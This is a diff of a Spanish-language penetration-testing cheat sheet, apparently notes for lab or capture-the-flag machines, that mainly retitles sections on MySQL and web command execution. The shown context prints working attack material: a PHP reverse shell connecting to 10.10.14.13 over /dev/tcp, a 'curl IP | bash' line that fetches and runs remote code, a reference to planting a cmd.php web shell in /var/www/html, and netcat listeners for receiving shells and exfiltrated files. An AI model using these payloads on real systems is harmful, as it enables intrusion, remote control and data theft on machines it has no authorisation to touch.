@@ -31,7 +31,7 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 ❯ nc -nlvp 443 > file.txt              # El archivo que reciba lo colocara en file.txt (Maquina victima 'Recibe')
 ```
 
-## Reveseshell MySQL
+## RCE MySQL
 
 ```bash 
 # Debemos estar dentro del servicio de MySQL
@@ -98,8 +98,11 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 * phar
 ```
 
-Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
+## RCE en Web
+
 ```php
+# Para ejecutar comandos en la Web debemos de crear o subir un archivo en el /var/www/html con el siguiente contenido: 
+
 ❯ nano cmd.php
 
 	<?php 
@@ -120,7 +123,8 @@ Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/va
 ❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
 ```
 
-**ReverShell en php:**
+## ReverShell en php:
+
 ```php
 <?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
@@ -130,8 +134,9 @@ Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/va
 	# 443 = Puerto a usar
 ```
 
-Escucha por Netcat en espera de la **ReverShell**:
 ```bash
+# Escucha por Netcat en espera de la Revershell
+
 ❯ nc -nlvp 443            # Linux
 
 ❯ rlwrap nc -nlvp 443     # Windows 
